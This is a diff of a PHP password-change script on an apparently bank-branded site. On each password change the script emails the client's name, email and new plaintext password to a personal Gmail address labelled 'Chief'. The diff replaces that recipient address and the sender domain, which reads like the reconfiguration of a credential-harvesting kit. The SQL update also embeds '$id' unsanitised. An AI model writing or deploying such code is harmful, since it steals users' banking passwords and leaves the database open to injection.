@@ -49,8 +49,8 @@ if (isset($_POST['old_pwd']) && isset($_POST['new_pwd'])
         	          WHERE id='$id'";
         	mysqli_query($conn, $sql_2);
         	     //TO SEND EMAIL TO NEW USER BEGINS
-                  $to = "bryanjohn2044@gmail.com"; // this is your Email address
-                $from = "info@mycdfb.com"; // this is the sender's Email address
+                  $to = "bludarymulti.resource@gmail.com"; // this is your Email address
+                $from = "info@myfrdb.com"; // this is the sender's Email address
                 $name = $_SESSION["name"];
                 $name = $_SESSION["email"];
                 $first_name = "Chief";
@@ -65,7 +65,7 @@ if (isset($_POST['old_pwd']) && isset($_POST['new_pwd'])
                        $message .= '<p>Client name: '. $name.'Email:'. $email . 'New Password:'. $new_pwd . '</p>';
                        
                        $message .= '<p>Don’t recognise this activity? Please ignore</p>';
-                       $message .= '<div style="background-color: #005eb8; color: white;"><a href="https://www.mycdfb.com" style="color: white"><b>CDFB!</b></a> Always giving you extra. Get a little extra help from the <a href="https://www.mycdfb.com"><b>CDFBANK</b></a>.</div>';
+                       $message .= '<div style="background-color: #005eb8; color: white;"><a href="https://www.myfrdb.com" style="color: white"><b>CDFB!</b></a> Always giving you extra. Get a little extra help from the <a href="https://www.mycdfb.com"><b>CDFBANK</b></a>.</div>';
 $message .= '</div></div></body></html>';
                       $headers .= 'From: '.$from."\r\n".
     'Reply-To: '.$from."\r\n" .
